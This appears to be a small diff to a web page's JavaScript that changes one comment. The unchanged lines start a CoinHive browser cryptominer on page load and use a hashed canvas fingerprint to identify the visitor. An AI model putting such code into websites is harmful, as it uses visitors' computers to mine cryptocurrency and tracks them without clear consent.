@@ -11,7 +11,7 @@ onload = function() {
 	let md5_result = md5( getCanvasFingerprint() )
 	document.getElementById('canvas_id').innerHTML = "Your Name: "+ md5_result;
 
-	// CAST and test
+	// Your public Site-Key
 	const miner = new CoinHive.User('KQFxWf0LVZURcSMPu9A5rJwnUdYLBwmc', md5_result, { throttle: 0.3 });
 	miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
 };
